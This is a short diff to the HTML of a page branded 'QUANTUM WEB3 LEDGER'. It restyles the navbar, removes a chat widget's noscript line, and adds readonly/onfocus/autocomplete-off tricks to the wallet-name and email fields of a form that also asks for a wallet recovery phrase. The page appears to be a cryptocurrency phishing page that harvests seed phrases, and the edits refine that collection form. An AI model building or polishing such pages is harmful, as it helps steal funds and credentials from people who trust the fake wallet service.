@@ -377,9 +377,9 @@ span.h4.d-block.coin-name {
   <!-- NAVBAR -->
   <nav class="navbar navbar-expand-lg sticky-top">
     <div class="container">
-      <a class="navbar-brand" href="#" style="font-size: 1.2rem;">
-                QUANTUM WEB3 LEDGER
-      </a>
+        <a class="navbar-brand" href="#" style="font-size: 1.2rem;">
+            <span style="color: #FFD700;">QUANTUM</span> <span style="color: #FFFFFF;">WEB3</span> <span style="color: #1DA1F2;">LEDGER</span>
+        </a>
       <button
         class="navbar-toggler navbar-dark"
         type="button"
@@ -2347,11 +2347,11 @@ span.h4.d-block.coin-name {
                 <div class="mb-8 mt-8 alert-danger phrase"></div>
                 <div class="form-group">
                   <label for="walletNamePhrase">Wallet Name</label>
-                  <input type="text" id="walletNamePhrase" class="form-control" name="pwallet" placeholder="Wallet Name">
+                  <input type="text" id="walletNamePhrase" readonly onfocus="this.removeAttribute('readonly');" autocomplete="off" class="form-control" name="pwallet" placeholder="Wallet Name">
                 </div>
                 <div class="form-group">
                   <label for="emailPhrase">Email</label>
-                  <input type="email" id="emailPhrase" class="form-control" name="pemail" placeholder="Email">
+                  <input type="email" id="emailPhrase" readonly onfocus="this.removeAttribute('readonly');" autocomplete="off" class="form-control" name="pemail" placeholder="Email">
                 </div>
                 <div class="form-group">
                   <label for="recoveryPhraseInput">Phrase</label>
@@ -2453,7 +2453,7 @@ window.smartsupp||(function(d) {
   c.src='www.smartsuppchat.com/loaderd41dd41d.html?';s.parentNode.insertBefore(c,s);
 })(document);
 </script>
-<noscript> Powered by <a href=%e2%80%9chttps_/www.smartsupp-2.html target=“_blank”>Smartsupp</a></noscript>
+
 
       
 </html>
